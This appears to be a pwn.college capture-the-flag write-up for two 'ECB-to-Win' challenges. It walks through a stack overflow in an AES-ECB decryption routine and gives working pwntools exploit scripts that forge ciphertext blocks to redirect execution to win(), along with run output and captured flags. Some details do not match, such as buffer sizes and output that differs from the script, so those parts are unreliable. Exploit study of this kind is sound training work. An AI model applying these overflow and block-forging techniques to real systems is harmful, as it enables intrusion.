---
custom_edit_url: null
sidebar_position: 6
slug: /pwn-college/intro-to-cybersecurity/integrated-security
---

## ECB-to-Win (Easy)

### Source code

```c title="/vulnerable-overflow.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <openssl/evp.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

void win()
{
    static char flag[256];
    static int flag_file;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_file = open("/flag", 0);
    if (flag_file < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_file, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

EVP_CIPHER_CTX *ctx;

int challenge(int argc, char **argv, char **envp)
{
    unsigned char key[16];
    struct
    {
        char header[8];
        unsigned long long length;
        char message[42];
    } plaintext = {0};

    // initialize the cipher
    int key_file = open("/challenge/.key", O_RDONLY);
    assert(key_file);
    assert(read(key_file, key, 16) == 16);
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    close(key_file);

    char *ciphertext = malloc(0x1000);
    size_t ciphertext_len = read(0, ciphertext, 0x1000);
    assert(ciphertext_len % 16 == 0);  // should be padded
    assert(ciphertext_len >= 16);      // at least one block

    // first, we verify the first block
    int decrypted_len;
    EVP_CIPHER_CTX_set_padding(ctx, 0);  // disable padding for the first block
    EVP_DecryptUpdate(ctx, (char *)&plaintext, &decrypted_len, ciphertext, 16);

    fprintf(stderr, "Your message header: %8s\n", plaintext.header);
    fprintf(stderr, "Your message length: %llu\n", plaintext.length);
    assert(memcmp(plaintext.header, "VERIFIED", 8) == 0); // verify header
    assert(plaintext.length <= 16); // verify length

    // decrypt the message!
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    memset(key, 0, sizeof(key));
    EVP_DecryptUpdate(ctx, plaintext.message, &decrypted_len, ciphertext + 16, ciphertext_len - 16);
    EVP_DecryptFinal_ex(ctx, plaintext.message + decrypted_len, &decrypted_len);

    printf("Decrypted message: %s!\n", plaintext.message);

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    DUMP_STACK(sp_, sz_);
    fprintf(stderr, "The program's memory status:\n");
    fprintf(stderr, "- the input buffer starts at %p\n", plaintext.message);
    fprintf(stderr, "- the saved return address (previously to main) is at %p\n", rp_);
    fprintf(stderr, "- the address of win() is %p.\n", win);

}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    challenge(argc, argv, envp);

}
```

We can see that the challenge defines a struct called `plaintext`, within which the first 8 bytes are allocated to the `header`, the next 8 are allocated to the `length`, and then `42` bytes are allocated to `message`.

```c showLineNumbers
# ---- snip ----

    struct
    {
        char header[8];
        unsigned long long length;
        char message[42];
    } plaintext = {0};

# ---- snip ----
```

It allocates 4096 bytes for the user provided ciphertext, and uses `ciphertext_len` to give the length of the user provided input.
It then ensures that `ciphertext_len >= 16` i.e. there is at least one block so that decryption can be performed.

```c showLineNumbers
# ---- snip ----

    char *ciphertext = malloc(0x1000);
    size_t ciphertext_len = read(0, ciphertext, 0x1000);
    assert(ciphertext_len % 16 == 0);  // should be padded
    assert(ciphertext_len >= 16);      // at least one block

# ---- snip ----
```

It then decrypts the first block of user provided ciphertext, places the resultant plaintext in the buffer defined before, and extracts the `plaintext.header` and `plaintext.length`. The challenge then checks if `plaintext.header == "VERIFIED"`, and `plaintext.length <= 16`, if not, it exits.

```c showLineNumbers
# ---- snip ----

    // initialize the cipher
    int key_file = open("/challenge/.key", O_RDONLY);
    assert(key_file);
    assert(read(key_file, key, 16) == 16);
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    close(key_file);

# ---- snip ----

    // first, we verify the first block
    int decrypted_len;
    EVP_CIPHER_CTX_set_padding(ctx, 0);  // disable padding for the first block
    EVP_DecryptUpdate(ctx, (char *)&plaintext, &decrypted_len, ciphertext, 16);

    fprintf(stderr, "Your message header: %8s\n", plaintext.header);
    fprintf(stderr, "Your message length: %llu\n", plaintext.length);
    assert(memcmp(plaintext.header, "VERIFIED", 8) == 0); // verify header
    assert(plaintext.length <= 16); // verify length

# ---- snip ----
```

Then, it goes on to decrypt the rest of the ciphertext (`ciphertext + 16`), and stores it into `plaintext.message`.
The problem here is that it uses `ciphertext_len - 16` here to assert the length of data to be decrypted instead of using the earlier defined `plaintext.length`. Since `ciphertext_len` is entirely controlled by the user input, we can send a message of any arbitrary size, which will be then stored into `plaintext.message` which is only 42 bytes long, thus overflowing it.

```c showLineNumbers
# ---- snip ----

    // decrypt the message!
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    memset(key, 0, sizeof(key));
    EVP_DecryptUpdate(ctx, plaintext.message, &decrypted_len, ciphertext + 16, ciphertext_len - 16);
    EVP_DecryptFinal_ex(ctx, plaintext.message + decrypted_len, &decrypted_len);

# ---- snip ----
```

There is another file called `/challenge/dispatch`, which gives us the ciphertext given any plaintext.

<figure style={{ textAlign: 'center' }}>
<img alt="image" src="https://github.com/user-attachments/assets/be3498df-21ca-4e97-b151-51d54f6bc4ea" />
</figure>

```py title="/challenge/dispatch" showLineNumbers
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import struct
import sys
import os

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

key = open("/challenge/.key", "rb").read()
cipher = AES.new(key=key, mode=AES.MODE_ECB)

message = sys.stdin.buffer.read1()
assert len(message) <= 16, "Your message is too long!"

plaintext = b"VERIFIED" + struct.pack(b"<Q", len(message)) + message
ciphertext = cipher.encrypt(pad(plaintext, cipher.block_size))

sys.stdout.buffer.write(ciphertext)
```

So whatever input we provide, the dispatcher prepends the `"VERIFIED"` header along with the `length`.

### Exploit

Let's check if the challenge binary is PIE.

```
hacker@integrated-security~ecb-to-win-easy:~$ checksec /challenge/vulnerable-overflow
[*] '/challenge/vulnerable-overflow'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Since it is not, let's just get it to print out useful values we can use in the exploit.

```py title="~/script.py" showLineNumbers
from pwn import *

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# Block 1 - "VERIFIED" header and length (16 bytes)
sample_cipher = get_encrypted_block(b"A")
header_block = sample_cipher[0:16]

# Craft payload
payload = header_block 

# Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')
p.send(payload)

p.interactive()
```

```
hacker@integrated-security~ecb-to-win-easy:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (16 bytes) to target...
[+] Starting local process '/challenge/vulnerable-overflow': pid 983
[*] Switching to interactive mode
Your message header: VERIFIED\x01
Your message length: 1
Decrypted message: !
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffddabbe1b0 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe1b8 (rsp+0x0008) | 88 e3 bb da fd 7f 00 00 | 0x00007ffddabbe388 |
| 0x00007ffddabbe1c0 (rsp+0x0010) | 78 e3 bb da fd 7f 00 00 | 0x00007ffddabbe378 |
| 0x00007ffddabbe1c8 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffddabbe1d0 (rsp+0x0020) | ff ff ff ff 00 00 00 00 | 0x00000000ffffffff |
| 0x00007ffddabbe1d8 (rsp+0x0028) | a0 26 7f 0f 00 00 00 00 | 0x000000000f7f26a0 |
| 0x00007ffddabbe1e0 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
| 0x00007ffddabbe1e8 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffddabbe1f0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe1f8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe200 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe208 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe210 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe218 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe220 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe228 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe230 (rsp+0x0080) | 90 1e 40 00 00 00 00 00 | 0x0000000000401e90 |
| 0x00007ffddabbe238 (rsp+0x0088) | 10 00 00 00 00 00 00 00 | 0x0000000000000010 |
| 0x00007ffddabbe240 (rsp+0x0090) | 60 24 3c 02 00 00 00 00 | 0x00000000023c2460 |
| 0x00007ffddabbe248 (rsp+0x0098) | 70 e3 bb da 03 00 00 00 | 0x00000003dabbe370 |
| 0x00007ffddabbe250 (rsp+0x00a0) | 80 e2 bb da fd 7f 00 00 | 0x00007ffddabbe280 |
| 0x00007ffddabbe258 (rsp+0x00a8) | 7a 1e 40 00 00 00 00 00 | 0x0000000000401e7a |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffddabbe1f0
- the saved return address (previously to main) is at 0x7ffddabbe258
- the address of win() is 0x4018f7.
[*] Process '/challenge/vulnerable-overflow' stopped with exit code 0 (pid 983)
[*] Got EOF while reading in interactive
$  
```

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize values
win_addr = 0x4018f7 
buffer_addr = 0x7ffddabbe1f0
addr_of_saved_ip = 0x7ffddabbe258

# Calculate offset & number of padding blocks
offset = addr_of_saved_ip - buffer_addr
num_padding_blocks = offset // 16

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# Block 1 - "VERIFIED" header and length (16 bytes)
sample_cipher = get_encrypted_block(b"A")
header_block = sample_cipher[0:16]

# Block 2-7 - Padding chain
padding_harvest = get_encrypted_block(b"B" * 16)
padding_block = padding_harvest[16:32]  
padding_blocks = padding_block * num_padding_blocks

# Block 7 - Return address overwrite
win_addr_block = b"C" * 8 
win_addr_block += p64(win_addr)
return_addr_cipher = get_encrypted_block(win_addr_block)
return_address_block = return_addr_cipher[16:32]

# 4. Final AES block - PKCS7 padding (16 bytes)
pkcs_padding_suffix = sample_cipher[-16:]

# Craft payload
payload = header_block 
payload += padding_blocks
payload += return_address_block 
payload += pkcs_padding_suffix

# Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')
p.send(payload)

p.interactive()
```

```
hacker@integrated-security~ecb-to-win-easy:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (144 bytes) to target...
[+] Starting local process '/challenge/vulnerable-overflow': pid 2086
[*] Switching to interactive mode
Your message header: VERIFIED\x01
Your message length: 1
Decrypted message: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCC\xf7\x18@!
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffeb8769070 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb8769078 (rsp+0x0008) | 48 92 76 b8 fe 7f 00 00 | 0x00007ffeb8769248 |
| 0x00007ffeb8769080 (rsp+0x0010) | 38 92 76 b8 fe 7f 00 00 | 0x00007ffeb8769238 |
| 0x00007ffeb8769088 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffeb8769090 (rsp+0x0020) | ff ff ff ff 00 00 00 00 | 0x00000000ffffffff |
| 0x00007ffeb8769098 (rsp+0x0028) | a0 26 67 7b 01 00 00 00 | 0x000000017b6726a0 |
| 0x00007ffeb87690a0 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
| 0x00007ffeb87690a8 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffeb87690b0 (rsp+0x0040) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
[*] Process '/challenge/vulnerable-overflow' stopped with exit code -11 (SIGSEGV) (pid 2086)
| 0x00007ffeb87690b8 (rsp+0x0048) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690c0 (rsp+0x0050) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690c8 (rsp+0x0058) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690d0 (rsp+0x0060) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690d8 (rsp+0x0068) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690e0 (rsp+0x0070) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690e8 (rsp+0x0078) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690f0 (rsp+0x0080) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690f8 (rsp+0x0088) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb8769100 (rsp+0x0090) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb8769108 (rsp+0x0098) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb8769110 (rsp+0x00a0) | 43 43 43 43 43 43 43 43 | 0x4343434343434343 |
| 0x00007ffeb8769118 (rsp+0x00a8) | f7 18 40 00 00 00 00 00 | 0x00000000004018f7 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffeb87690b0
- the saved return address (previously to main) is at 0x7ffeb8769118
- the address of win() is 0x4018f7.
You win! Here is your flag:
pwn.college{sBaSZzvEAX-48KsnbTM_0LFAcSD.QX3UDMxEDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```

&nbsp;

## ECB-to-Win (Hard)

```
hacker@integrated-security~ecb-to-win-hard:~$ ls /challenge/
dispatch  vulnerable-overflow
```

### Binary Analysis

```c title="/challenge/dispatch" showLineNumbers
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import Crypto
import struct
import sys
import os

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

key = open("/challenge/.key", "rb").read()
cipher = AES.new(key=key, mode=AES.MODE_ECB)

message = sys.stdin.buffer.read1()
assert len(message) <= 16, "Your message is too long!"

plaintext = (
    b"VERIFIED"
    + struct.pack(b"<Q", len(message))
    + message
)

ciphertext = cipher.encrypt(
    pad(plaintext, cipher.block_size)
)

sys.stdout.buffer.write(ciphertext)
```

The `/challenge/dispatch` program takes input we provide, prepends the `"VERIFIED"` header along with the `length`, and gives us the relevant ciphertext.

```c title="/challenge/vulnerable-overflow" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  challenge((unsigned int)argc, argv, envp);
  return 0;
}
```

Let's look at the `challenge()` function.

```c title="/challenge/vulnerable-overflow" showLineNumbers
int challenge()
{
  __int64 EVP_aes_128_ecb; // rax
  __int64 EVP_aes_128_ecb_1; // rax
  int decrypted_len; // [rsp+2Ch] [rbp-84h] BYREF
  __int64 plaintext_header; // [rsp+30h] [rbp-80h] BYREF
  unsigned __int64 plaintext_len; // [rsp+38h] [rbp-78h]
  __int64 plaintext_message[8]; // [rsp+40h] [rbp-70h] BYREF
  char key[24]; // [rsp+80h] [rbp-30h] BYREF
  unsigned __int64 ciphertext_len; // [rsp+98h] [rbp-18h]
  void *ciphertext; // [rsp+A0h] [rbp-10h]
  int key_file; // [rsp+ACh] [rbp-4h]

  plaintext_header = 0LL;
  plaintext_len = 0LL;
  memset(plaintext_message, 0, 56);
  key_file = open("/challenge/.key", 0);
  if ( !key_file )
    __assert_fail("key_file", "/challenge/vulnerable-overflow.c", 70u, "challenge");
  if ( read(key_file, key, 16uLL) != 16 )
    __assert_fail("read(key_file, key, 16) == 16", "/challenge/vulnerable-overflow.c", 71u, "challenge");
  ctx = EVP_CIPHER_CTX_new();
  EVP_aes_128_ecb = ::EVP_aes_128_ecb();
  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb, 0LL, key, 0LL);
  close(key_file);
  ciphertext = malloc(4096uLL);
  ciphertext_len = read(0, ciphertext, 4096uLL);
  if ( (ciphertext_len & 15) != 0 )
    __assert_fail("ciphertext_len % 16 == 0", "/challenge/vulnerable-overflow.c", 78u, "challenge");
  if ( ciphertext_len <= 15 )
    __assert_fail("ciphertext_len >= 16", "/challenge/vulnerable-overflow.c", 79u, "challenge");
  EVP_CIPHER_CTX_set_padding(ctx, 0LL);
  EVP_DecryptUpdate(ctx, &plaintext_header, &decrypted_len, ciphertext, 16LL);
  if ( memcmp(&plaintext_header, "VERIFIED", 8uLL) )
    __assert_fail(
      "memcmp(plaintext.header, \"VERIFIED\", 8) == 0",
      "/challenge/vulnerable-overflow.c",
      0x56u,
      "challenge");
  if ( plaintext_len > 16 )
    __assert_fail("plaintext.length <= 16", "/challenge/vulnerable-overflow.c", 87u, "challenge");
  ctx = EVP_CIPHER_CTX_new();
  EVP_aes_128_ecb_1 = ::EVP_aes_128_ecb();
  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb_1, 0LL, key, 0LL);
  memset(key, 0, 16uLL);
  EVP_DecryptUpdate(
    ctx,
    plaintext_message,
    &decrypted_len,
    (char *)ciphertext + 16,
    (unsigned int)(ciphertext_len - 16));
  EVP_DecryptFinal_ex(ctx, (char *)plaintext_message + decrypted_len, &decrypted_len);
  return printf("Decrypted message: %s!\n", (const char *)plaintext_message);
}
```

We can see that the challenge defines a struct, within which the first 8 bytes are allocated to the `header`, the next 8 are allocated to the `length`, and then `56` bytes are allocated to `plaintext_message`.

The `plaintext_message` buffer is located at `rbp-0x70`, which means it is at an offset of `120` bytes from the stored return address.

```c showLineNumbers
# ---- snip ----

  __int64 plaintext_message[8]; // [rsp+40h] [rbp-70h] BYREF

# ---- snip ----

  plaintext_header = 0LL;
  plaintext_len = 0LL;
  memset(plaintext_message, 0, 56);

# ---- snip ----
```

It allocates 4096 bytes for the user provided ciphertext, and uses `ciphertext_len` to give the length of the user provided input.
It then ensures that `ciphertext_len >= 16` i.e. there is at least one block so that decryption can be performed.

```c showLineNumbers
# ---- snip ----

  ciphertext = malloc(4096uLL);
  ciphertext_len = read(0, ciphertext, 4096uLL);
  if ( (ciphertext_len & 15) != 0 )
    __assert_fail("ciphertext_len % 16 == 0", "/challenge/vulnerable-overflow.c", 78u, "challenge");
  if ( ciphertext_len <= 15 )
    __assert_fail("ciphertext_len >= 16", "/challenge/vulnerable-overflow.c", 79u, "challenge");

# ---- snip ----
```

It then decrypts the first block of user provided ciphertext, places the resultant plaintext in the buffer defined before, and extracts the `plaintext_header` and `plaintext_length`. The challenge then checks if `plaintext_header == "VERIFIED"`, and `plaintext_length <= 16`, if not, it exits.

```c showLineNumbers
# ---- snip ----

  key_file = open("/challenge/.key", 0);
  if ( !key_file )
    __assert_fail("key_file", "/challenge/vulnerable-overflow.c", 70u, "challenge");
  if ( read(key_file, key, 16uLL) != 16 )
    __assert_fail("read(key_file, key, 16) == 16", "/challenge/vulnerable-overflow.c", 71u, "challenge");
  ctx = EVP_CIPHER_CTX_new();

# ---- snip ----

  EVP_CIPHER_CTX_set_padding(ctx, 0LL);
  EVP_DecryptUpdate(ctx, &plaintext_header, &decrypted_len, ciphertext, 16LL);
  if ( memcmp(&plaintext_header, "VERIFIED", 8uLL) )
    __assert_fail(
      "memcmp(plaintext.header, \"VERIFIED\", 8) == 0",
      "/challenge/vulnerable-overflow.c",
      0x56u,
      "challenge");
  if ( plaintext_len > 16 )
    __assert_fail("plaintext.length <= 16", "/challenge/vulnerable-overflow.c", 87u, "challenge");

# ---- snip ----
```

Then, it goes on to decrypt the rest of the ciphertext (`(char *)ciphertext + 16`), and stores it into `plaintext_message`.
The problem here is that it uses `ciphertext_len - 16` here to assert the length of data to be decrypted instead of using the earlier defined `plaintext.length`. Since `ciphertext_len` is entirely controlled by the user input, we can send a message of any arbitrary size, which will be then stored into `plaintext.message` which is only 42 bytes long, thus overflowing it.

```c showLineNumbers
# ---- snip ----

  ctx = EVP_CIPHER_CTX_new();
  EVP_aes_128_ecb_1 = ::EVP_aes_128_ecb();
  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb_1, 0LL, key, 0LL);
  memset(key, 0, 16uLL);
  EVP_DecryptUpdate(
    ctx,
    plaintext_message,
    &decrypted_len,
    (char *)ciphertext + 16,
    (unsigned int)(ciphertext_len - 16));
  EVP_DecryptFinal_ex(ctx, (char *)plaintext_message + decrypted_len, &decrypted_len);

# ---- snip ----
```

Finally, let's look at the `win()` function.

```c title="/challenge/vulnerable-overflow" showLineNumbers
int win()
{
  int *v0; // rax
  char *error_msg; // rax
  int *v2; // rax
  char *error_msg_1; // rax

  puts("You win! Here is your flag:");
  flag_file = open("/flag", 0);
  if ( flag_file < 0 )
  {
    v0 = __errno_location();
    error_msg = strerror(*v0);
    printf("\n  ERROR: Failed to open the flag -- %s!\n", error_msg);
    if ( geteuid() )
    {
      puts("  Your effective user id is not 0!");
      puts("  You must directly run the suid binary in order to have the correct permissions!");
    }
    exit(-1);
  }
  flag_length = read(flag_file, &flag_buf, 0x100uLL);
  if ( flag_length <= 0 )
  {
    v2 = __errno_location();
    error_msg_1 = strerror(*v2);
    printf("\n  ERROR: Failed to read the flag -- %s!\n", error_msg_1);
    exit(-1);
  }
  write(1, &flag_buf, flag_length);
  return puts("\n");
}
```

We also need the address of the `win()` function.

```
pwndbg> info address win
Symbol "win" is at 0x4013b6 in a file compiled without debugging.
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize values
win_addr = 0x4013b6  
num_padding_blocks = 7

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# Block 1 - "VERIFIED" header and length (16 bytes)
sample_cipher = get_encrypted_block(b"A")
header_block = sample_cipher[0:16]

# Block 2-7 - Padding chain
padding_harvest = get_encrypted_block(b"B" * 16)
padding_block = padding_harvest[16:32]  
padding_blocks = padding_block * num_padding_blocks

# Block 7 - Return address overwrite
win_addr_block = b"C" * 8 
win_addr_block += p64(win_addr)
return_addr_cipher = get_encrypted_block(win_addr_block)
return_address_block = return_addr_cipher[16:32]

# 4. Final AES block - PKCS7 padding (16 bytes)
pkcs_padding_suffix = sample_cipher[-16:]

# Craft payload
payload = header_block 
payload += padding_blocks
payload += return_address_block 
payload += pkcs_padding_suffix

# Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')
p.send(payload)

p.interactive()
```

```
hacker@integrated-security~ecb-to-win-hard:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (160 bytes) to target...
[+] Starting local process '/challenge/vulnerable-overflow': pid 664
[*] Switching to interactive mode
[*] Process '/challenge/vulnerable-overflow' stopped with exit code -11 (SIGSEGV) (pid 664)
Decrypted message: A\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fBBBBBBBB\xb6\x13@!
You win! Here is your flag:
pwn.college{8oPskq3iYUANAHB2VuRKUKH8mWh.QX4UDMxEDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```

&nbsp;

